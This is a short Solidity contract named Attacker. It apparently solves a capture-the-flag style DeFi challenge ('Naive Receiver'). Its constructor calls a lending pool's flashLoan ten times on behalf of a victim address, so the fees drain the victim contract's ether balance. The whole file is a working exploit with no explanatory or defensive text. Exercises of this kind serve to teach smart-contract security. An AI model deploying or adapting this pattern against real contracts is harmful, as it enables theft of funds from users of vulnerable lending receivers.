import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract Attacker {
    address immutable victim;
    NaiveReceiverLenderPool immutable pool;

    constructor(address _victim, address _pool) {
        victim = _victim;
        pool = NaiveReceiverLenderPool(payable(_pool));

        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(address(victim), victim.balance);
        }
    }
}
